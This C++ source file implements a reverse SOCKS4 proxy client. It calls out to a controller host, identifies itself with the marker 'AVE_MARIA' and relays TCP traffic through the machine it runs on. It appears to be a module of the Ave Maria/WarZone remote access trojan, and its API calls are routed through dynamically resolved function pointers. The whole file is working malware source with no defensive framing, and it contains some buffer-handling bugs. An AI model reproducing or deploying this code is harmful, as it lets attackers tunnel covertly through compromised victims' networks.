#include "Socks.h"

#define TCP_STREAM_CON   0x01
#define REQUEST_GRANTED  0x5A
#define REQUEST_REJECTED 0x5B

#define GetByteInt(i, n) (i >> (8 * n)) & 0xff

static const BYTE gc_magik[] = { 'A', 'V', 'E', '_', 'M', 'A', 'R', 'I', 'A', 1 };

struct ClientThreadInfo
{
   CHAR  host[MAX_PATH];
   INT   port;
};

static SOCKET ConnectServer(CHAR *host, USHORT port)
{
   SOCKET      s;
   WSADATA     wsa;
   SOCKADDR_IN addr;
   if(!Funcs::pWSAStartup(MAKEWORD(2, 2), &wsa))
   {
      if((s = Funcs::pSocket(AF_INET, SOCK_STREAM, 0)) != INVALID_SOCKET)
      {
         hostent *he = Funcs::pGethostbyname(host);
         Funcs::pMemcpy(&addr.sin_addr, he->h_addr_list[0], he->h_length);

         addr.sin_family = AF_INET;
         addr.sin_port   = Funcs::pHtons(port);

         if(!Funcs::pConnect(s, (sockaddr *) &addr, sizeof(addr)))
            return s;
      }
   }
   return NULL;
}

static BOOL QueryProxy(SOCKET s_recv, SOCKET s_send)
{
   UINT bytes = 0;
   if(Funcs::pIoctlsocket(s_recv, FIONREAD, (u_long *) &bytes) == SOCKET_ERROR)
      return FALSE;

   if(bytes)
   {
      char buffer[2048] = { 0 };
      if((bytes = Funcs::pRecv(s_recv, buffer, sizeof(buffer), 0)) <= 0)
         return FALSE;
      if(Funcs::pSend(s_send, buffer, bytes, 0) <= 0)
         return FALSE;
   }
   else
      Funcs::pSleep(1);
   return TRUE;
}

static BOOL SendResponse(SOCKET s, BYTE status)
{
   INT j; BYTE i = 0;

   if(Funcs::pSend(s, (PCHAR) &i, sizeof(i), 0) <= 0)
      return FALSE;

   i = status;
   if(Funcs::pSend(s, (PCHAR) &i, sizeof(i), 0) <= 0)
      return FALSE;

   i = 0;
   for (j = 0; j < 6; ++j)
   {
      if(Funcs::pSend(s, (PCHAR) &i, sizeof(i), 0) <= 0)
         return FALSE;
   }
   return TRUE;
}

static UINT WINAPI ClientConnectionThread(ClientThreadInfo *info)
{
   DWORD ip, i;
   USHORT port;
   BYTE version = 0, commandType = 0;

   SOCKET socksSocket = ConnectServer(info->host, info->port);
   if(socksSocket == INVALID_SOCKET)
      goto exit;
   
   if(Funcs::pRecv(socksSocket, (CHAR *) &version, sizeof(version), 0) <= 0)
      goto exit;

   if(Funcs::pRecv(socksSocket, (CHAR *) &commandType, sizeof(commandType), 0) <= 0)
      goto exit;

   if(Funcs::pRecv(socksSocket, (CHAR *) &port, sizeof(port), 0) <= 0)
      goto exit; 

   port = Funcs::pNtohs(port);
   if(Funcs::pRecv(socksSocket, (CHAR *) &ip, sizeof(ip), 0) <= 0)
      goto exit;

   CHAR ipStr[16]   = { 0 };
   CHAR userId[255] = { 0 };
   Funcs::pWsprintfA(ipStr, "%u.%u.%u.%u", GetByteInt(ip, 0), GetByteInt(ip, 1), GetByteInt(ip, 2), GetByteInt(ip, 3));

   for(i = 0; ; ++i)
   {
      if(sizeof(userId) <= i)
         goto exit;
      if(Funcs::pRecv(socksSocket, (CHAR *) &userId, sizeof(userId), 0) <= 0)
         goto exit;
      if (!userId[i]) break; 
   }

   if(commandType != TCP_STREAM_CON)
   {
      SendResponse(socksSocket, REQUEST_REJECTED);
      goto exit;
   }

   SOCKET proxySocket = ConnectServer(ipStr, port);
   if(proxySocket == INVALID_SOCKET)
      goto exit;
               
   if(SendResponse(socksSocket, REQUEST_GRANTED) <= 0)
      goto exit;
   
   for(;;)
   {
      if(!QueryProxy(proxySocket, socksSocket))
         goto exit;
      if(!QueryProxy(socksSocket, proxySocket))
         goto exit;
   }

exit:
   Funcs::pClosesocket(socksSocket);
   return 0;
}

static UINT WINAPI ClientThread(ClientThreadInfo *info)
{
   SOCKET s = ConnectServer(info->host, info->port);
   if(s == INVALID_SOCKET)
      goto exit;
   
   if(Funcs::pSend(s, (CHAR *) gc_magik, sizeof(gc_magik), 0) <= 0)
      goto exit;

   for(;;)
   {
      INT port = 0;
      if(Funcs::pRecv(s, (CHAR *) &port, sizeof(port), 0) <= 0)
         goto exit;
      info->port = port;
      Funcs::pCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE) ClientConnectionThread, (VOID *) info, 0, 0);
   }
exit:
   Funcs::pFree(info);
   return ERROR;
}

BOOL StartSocksClient(CHAR *host, INT port)
{
   ClientThreadInfo *info = (ClientThreadInfo *) Alloc(sizeof(*info));
   if(info)
   {
      if(host)
      {
         Funcs::pLstrcpyA(info->host, host);
         info->port = port;

         Funcs::pCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE) ClientThread, (VOID *) info, 0, 0);
         return TRUE;
      }
   }
   Funcs::pFree(info);
   return FALSE;
}